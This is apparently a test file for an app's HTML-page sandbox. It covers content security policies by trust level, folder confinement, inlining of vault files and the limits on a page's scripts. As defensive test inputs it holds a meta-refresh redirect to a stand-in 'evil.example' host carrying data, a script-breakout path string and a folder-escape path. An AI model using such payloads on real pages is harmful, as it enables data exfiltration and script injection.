// HTML pages (docs/html-pages.md): what makes a file a page, the policy that fits its trust, its files inlined from the vault, its
// embeds, the frame's page, where a page came from, and what its `golem` calls may do.

import assert from 'node:assert/strict';
import { test } from 'node:test';

import { composePage, embedAddresses, fillEmbeds, inlineFiles, isPageHtml, isRelative, pageAsks, pageCsp, policyFor, resolvePath } from '../src/pages/compose.ts';
import { scopeCss, tableHtml, resultHtml } from '../src/pages/embedHtml.ts';
import { editOps, PageRequests } from '../src/pages/requests.ts';
import { fingerprint, PageMemory, trustOf } from '../src/pages/trust.ts';
import { answerKey } from '../src/pages/answers.ts';
import { openingView } from '../src/pages/detect.ts';
import type { ScriptVault } from '../src/scripts/vault.ts';

const enc = (s: string) => new TextEncoder().encode(s);

test('a page is HTML with a script, an embed or a golem meta; anything else is a document', () => {
  assert.equal(isPageHtml('<h1>Notes</h1><p>Plain</p>'), false);
  assert.equal(isPageHtml('<p>x</p><script>1</script>'), true);
  assert.equal(isPageHtml('<golem-embed src="Budget.xlsx#Total"></golem-embed>'), true);
  assert.equal(isPageHtml('<meta name="golem-reads" content="Books/">'), true);
});

test('a page opens as a page unless Source was last chosen; other HTML as it was last shown', () => {
  const page = '<p>x</p><script>1</script>';
  assert.equal(openingView(page, null), 'page');
  assert.equal(openingView(page, 'document'), 'page', 'Document never sticks to a page');
  assert.equal(openingView(page, 'source'), 'source');
  assert.equal(openingView('<p>plain</p>', null), 'document');
  assert.equal(openingView('<p>plain</p>', 'page'), 'page');
});

test('a page asks for folders and hosts in its metas', () => {
  const asks = pageAsks('<meta name="golem-reads" content="/Books/, Work/Reports , Books"><meta name=golem-network content="https://api.example.com/v1, not a host, cdn.example.org">');
  assert.deepEqual(asks.reads, ['Books', 'Work/Reports']);
  assert.deepEqual(asks.network, ['api.example.com', 'cdn.example.org']);
});

test('an own page runs scripts and has the network; a foreign one that may read has neither', () => {
  const asks = { reads: ['Books'], network: ['api.example.com'] };
  const own = policyFor('own', false, asks);
  assert.deepEqual(own, { scripts: true, network: true, connect: ['api.example.com'] });
  const ownCsp = pageCsp(own);
  assert.match(ownCsp, /script-src 'unsafe-inline' 'unsafe-eval' data: blob: https:/);
  assert.match(ownCsp, /connect-src https:\/\/api\.example\.com/);
  // A foreign page that may not read keeps its scripts and network: it has nothing of the person's to send.
  assert.deepEqual(policyFor('foreign', false, asks), own);
  const reading = policyFor('foreign', true, asks);
  assert.deepEqual(reading, { scripts: false, network: false, connect: [] });
  const csp = pageCsp(reading);
  assert.match(csp, /script-src 'none'/);
  assert.match(csp, /connect-src 'none'/);
  assert.match(csp, /img-src data: blob:;/);
  assert.match(csp, /form-action 'none'/);
  assert.doesNotMatch(csp, /https:/);
});

test('relative addresses resolve inside the vault, and a floor keeps a foreign page in its folder', () => {
  assert.equal(isRelative('chart.png'), true);
  assert.equal(isRelative('https://x.com/a.png'), false);
  assert.equal(isRelative('//cdn/x.js'), false);
  assert.equal(isRelative('#top'), false);
  assert.equal(isRelative('data:image/png;base64,'), false);
  assert.equal(resolvePath('Reports/Q3', 'img/a%20b.png?v=2#x'), 'Reports/Q3/img/a b.png');
  assert.equal(resolvePath('Reports/Q3', '../shared.css'), 'Reports/shared.css');
  assert.equal(resolvePath('Reports', '../../x.css'), null);
  assert.equal(resolvePath('Reports/Q3', '../shared.css', 'Reports/Q3'), null);
  assert.equal(resolvePath('Reports/Q3', 'style.css', 'Reports/Q3'), 'Reports/Q3/style.css');
  assert.equal(resolvePath('Reports', '/Diary/today.md'), 'Diary/today.md');
});

test('files beside a page are inlined: pictures, scripts, stylesheets and what they name', async () => {
  const files: Record<string, string> = {
    'Site/pic.png': 'PNG',
    'Site/app.js': 'console.log(1)',
    'Site/style.css': 'body{background:url("bg.png")} @import "more.css";',
    'Site/bg.png': 'BG',
    'Site/more.css': 'p{}',
    'Private/secret.txt': 'secret',
  };
  const read = async (path: string) => (files[path] ? { bytes: enc(files[path]), type: path.endsWith('.css') ? 'text/css' : 'application/octet-stream' } : null);
  const html = '<img src="pic.png"><script src="app.js"></script><link rel="stylesheet" href="style.css"><a href="other.html">x</a><img src="https://example.com/x.png"><script>const s = "<img src=\'pic.png\'>";</script><div style="background:url(bg.png)"></div><img src="../Private/secret.txt">';
  const own = await inlineFiles(html, 'Site', read, null);
  assert.match(own.html, /<img src="data:application\/octet-stream;base64,UE5H">/);
  assert.match(own.html, /<script src="data:application\/octet-stream;base64,[^"]+"><\/script>/);
  assert.match(own.html, /<link rel="stylesheet" href="data:text\/css;base64,/);
  assert.match(own.html, /<a href="other.html">/, 'links are opened by the app, not inlined');
  assert.match(own.html, /https:\/\/example\.com\/x\.png/);
  assert.match(own.html, /const s = "<img src='pic.png'>";/, 'script text is left as written');
  assert.match(own.html, /style="background:url\(&quot;data:/);
  const css = own.html.match(/href="data:text\/css;base64,([^"]+)"/)![1];
  assert.match(atob(css), /url\("data:/, "a stylesheet's own files are inlined too");
  assert.ok(own.files.includes('Private/secret.txt'), 'an own page reaches the whole vault');
  const foreign = await inlineFiles(html, 'Site', read, 'Site');
  assert.match(foreign.html, /<img src="\.\.\/Private\/secret\.txt">/, "a foreign page can't climb out of its folder");
  assert.ok(!foreign.files.includes('Private/secret.txt'));
});

test('embeds are found and filled by address', () => {
  const html = '<golem-embed src="Budget.xlsx#Total">old</golem-embed><p>x</p><golem-embed inline src=\'Notes.md#Plan\'></golem-embed><golem-embed src="Budget.xlsx#Total"></golem-embed>';
  assert.deepEqual(embedAddresses(html), ['Budget.xlsx#Total', 'Notes.md#Plan']);
  const filled = fillEmbeds(html, new Map([['Budget.xlsx#Total', '<b>42</b>']]));
  assert.equal(filled, '<golem-embed src="Budget.xlsx#Total"><b>42</b></golem-embed><p>x</p><golem-embed inline src=\'Notes.md#Plan\'></golem-embed><golem-embed src="Budget.xlsx#Total"><b>42</b></golem-embed>');
});

test("the frame's page starts with the policy and the runtime, keeps the doctype first and drops a refresh", () => {
  const page = composePage('<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example/?d=1"><title>T</title></head><body>hi</body></html>', "default-src 'none'", { path: 'a.html', trust: 'own', scroll: 0 });
  assert.match(page, /^<!DOCTYPE html><meta http-equiv="Content-Security-Policy" content="default-src &#39;none&#39;|^<!DOCTYPE html><meta http-equiv="Content-Security-Policy" content="default-src 'none'"/);
  assert.ok(page.indexOf('window.golem') < page.indexOf('<title>'), 'the runtime runs before the page');
  assert.doesNotMatch(page, /refresh/);
  const still = composePage('<p>hi</p>', "default-src 'none'", null);
  assert.doesNotMatch(still, /<script/, 'a page whose scripts may not run gets no runtime');
  assert.match(still, /^<meta http-equiv="Content-Security-Policy"/);
});

test("a page's runtime can't break out of its script with a path", () => {
  const page = composePage('<p>x</p>', "default-src 'none'", { path: '</script><script>alert(1)</script>.html', trust: 'own', scroll: 0 });
  assert.equal(page.match(/<\/script>/g)!.length, 1);
});

test('own unless it came from elsewhere; a mark makes it own until its bytes change', () => {
  const hash = fingerprint(enc('<p>a</p>'));
  assert.equal(trustOf({ hash }), 'own');
  assert.equal(trustOf({ hash, role: 'owner' }), 'own');
  assert.equal(trustOf({ hash, role: 'editor' }), 'foreign');
  assert.equal(trustOf({ hash, role: 'owner', byOther: true }), 'foreign');
  assert.equal(trustOf({ hash, imported: true }), 'foreign');
  assert.equal(trustOf({ hash, downloaded: true }), 'foreign');
  assert.equal(trustOf({ hash, downloaded: true, markedHash: hash }), 'own');
  assert.equal(trustOf({ hash, downloaded: true, markedHash: fingerprint(enc('<p>b</p>')) }), 'foreign');
  assert.notEqual(fingerprint(enc('ab')), fingerprint(enc('ba')));
});

test('this device remembers pages: imported, marked, allowed reads for these bytes, and how each was shown', () => {
  const store = new Map<string, string>();
  const memory = new PageMemory({ getItem: (k) => store.get(k) ?? null, setItem: (k, v) => void store.set(k, v) });
  memory.setImported('new');
  memory.moved('new', 'kept');
  assert.equal(memory.imported('kept'), true);
  memory.markMine('kept', 'h1');
  assert.equal(memory.marked('kept'), 'h1');
  memory.allowReads('kept', 'h1', ['Books']);
  assert.deepEqual(memory.reads('kept', 'h1'), ['Books']);
  assert.equal(memory.reads('kept', 'h2'), null, 'a changed page asks again');
  memory.setView('kept', 'source');
  assert.equal(memory.view('kept'), 'source');
  assert.equal(memory.view('other'), null);
});

test("an embed's document styles apply inside the embed only", () => {
  const scoped = scopeCss('body { font-family: Calibri; }\n/* note */ p, h1 { margin: 0; }\n th, td { border: 1px solid #000; }\n@media print { p { color: red; } }');
  assert.equal(scoped, 'golem-embed { font-family: Calibri; }\ngolem-embed p, golem-embed h1 { margin: 0; }\ngolem-embed th, golem-embed td { border: 1px solid #000; }');
});

test('embeds show tables, values and errors as HTML, escaped', () => {
  const html = tableHtml({ kind: 'table', rows: [['Name', 'Total'], ['<b>', '1\n2']], header: true, align: ['left', 'right'] });
  assert.equal(html, '<table><thead><tr><th>Name</th><th style="text-align:right">Total</th></tr></thead><tbody><tr><td>&lt;b&gt;</td><td style="text-align:right">1<br>2</td></tr></tbody></table>');
  assert.equal(resultHtml({ kind: 'value', text: '<i>' }, () => ''), '&lt;i&gt;');
  assert.match(resultHtml({ kind: 'error', code: 'missing' }, () => 'No <such> file'), /class="golem-embed-error"[^>]*>No &lt;such&gt; file</);
});

function vault(files: Record<string, string>): ScriptVault {
  const stored = Object.fromEntries(Object.entries(files).map(([k, v]) => [k, enc(v)]));
  return {
    list: async (folder) => Object.keys(stored).filter((p) => folder === '' || p.startsWith(`${folder}/`)).map((path) => ({ path, bytes: stored[path] })),
    file: async (path) => (stored[path] ? { path, bytes: stored[path] } : null),
    produce: async () => ({ kind: 'value', text: '42' }),
  };
}

test("an own page reads and changes the vault; a foreign one's scripts do neither", async () => {
  const stores: string[] = [];
  const logged: number[] = [];
  const deps = {
    vault: vault({ 'Books/Dune.md': '---\nauthor: Herbert\n---\n# Dune\n' }),
    embed: async () => ({ result: { kind: 'value' as const, text: '7' }, paths: ['Books/Dune.md'] }),
    store: async (file: { path: string }) => void stores.push(file.path),
    logged: (files: readonly unknown[]) => void logged.push(files.length),
  };
  const own = new PageRequests(deps, { path: 'Site/index.html', name: 'index.html', trust: 'own' });
  const notes = (await own.handle('notes', ['Books'])) as { title: string; fields: Record<string, string> }[];
  assert.equal(notes[0].title, 'Dune');
  assert.equal(notes[0].fields.author, 'Herbert');
  assert.equal(await own.handle('embed', ['Budget.xlsx#Total']), '7');
  assert.ok(own.read.has('Books/') && own.read.has('Books/Dune.md'));
  assert.equal(await own.handle('edit', ['Books/Dune.md', [{ op: 'append', markdown: 'Read it.' }]]), 1);
  assert.deepEqual(stores, ['Books/Dune.md']);
  assert.deepEqual(logged, [1]);
  const foreign = new PageRequests(deps, { path: 'In/page.html', name: 'page.html', trust: 'foreign' });
  await assert.rejects(foreign.handle('notes', ['Books']));
  await assert.rejects(foreign.handle('embed', ['Budget.xlsx#Total']));
  await assert.rejects(foreign.handle('edit', ['Books/Dune.md', [{ op: 'append', markdown: 'x' }]]));
  await assert.rejects(own.handle('fetch', ['https://example.com']));
});

test("a page's edits are only the known operations", () => {
  assert.deepEqual(editOps([{ op: 'setField', key: 'status', value: 3 }]), [{ op: 'setField', key: 'status', value: '3' }]);
  assert.throws(() => editOps([{ op: 'delete' }]));
  assert.throws(() => editOps('append'));
});

test("a read's answer is kept under its operation and arguments", () => {
  assert.equal(answerKey('notes', ['Books']), 'notes:["Books"]');
});
